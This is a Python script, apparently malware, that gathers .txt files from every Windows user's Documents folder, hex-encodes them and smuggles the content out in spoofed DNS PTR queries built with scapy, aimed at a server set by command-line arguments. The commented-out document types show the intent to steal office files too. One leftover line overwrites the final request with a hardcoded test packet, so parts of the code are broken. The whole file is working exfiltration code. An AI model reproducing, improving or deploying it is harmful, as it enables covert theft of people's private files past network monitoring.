from time import sleep
from scapy.all import IP, UDP, DNS, DNSQR, send
from sys import argv
import os
import base64


C2           = argv[1]
DNSSERVER    = argv[2]
SLEEP        = argv[3]
FILES_I_WANT = (".txt")#, ".docx", ".pdf", ".xlsx", ".pptx")


def read_files():
    list = os.listdir('c:\\users')
    files_list = []
    for user in list:
        for subdir, dirs, files in os.walk((f'c:\\users\\{user}\Documents')):
            for file in files:
                if(file.endswith(FILES_I_WANT)):
                    files_list.append(os.path.join(subdir, file))
    return files_list


def send_data(files):
    for file in files:
        i = 0
        sleep(10)
        # Send file content in chunks
        for chunk in get_chunks(file): 
            ip_addr = '.'.join(list((f'{str(i).zfill(6)}{chunk}')))
            req =IP(src=C2 ,dst=DNSSERVER) / UDP(sport=60696, dport=53) / DNS(rd=1,qd=DNSQR(qtype=12, qname=f"{ip_addr}.ip6.arpa"))
            # send twice bc UDP?
            send(req, verbose=False)
            sleep(0.01)
            send(req, verbose=False)
            sleep(0.01)

            i += 1
            
        # Send file name last
        name = file.split('\\')[-1]
        name = base64.b16encode(name.encode('ascii')).decode('ascii').zfill(26)
        sleep(5)
        ip_addr = '.'.join(list((f'999999{name}')))
        fin_req =IP(src=C2 ,dst=DNSSERVER) / UDP(sport=60696, dport=53) / DNS(rd=1,qd=DNSQR(qtype=12, qname=f"{ip_addr}.ip6.arpa"))
        fin_req =IP(src='10.0.0.11' ,dst='10.0.0.138') / UDP(sport=60696, dport=53) / DNS(id=300, rd=1,qd=DNSQR(qtype=12, qname="ip_addr.ip6.arpa"))
        # send twice bc UDP?
        send(fin_req)
        sleep(1)
        send(fin_req)
        #sleep(10)



def base64_file(file):
    try:
        with open(file, "rb") as p_file:
            encoded_string = base64.b16encode(p_file.read())
        return encoded_string
    except:
        return ""


def get_chunks(file):
    tmp_chunks = []
    encoded_file = base64_file(file)
    for i in range(0,len(encoded_file), 26):
        tmp_chunks.append(encoded_file[i:i+26].decode('ascii'))
    return tmp_chunks


def main():
    send_data(read_files())
    print("bye")


if "__main__" == __name__:
    main()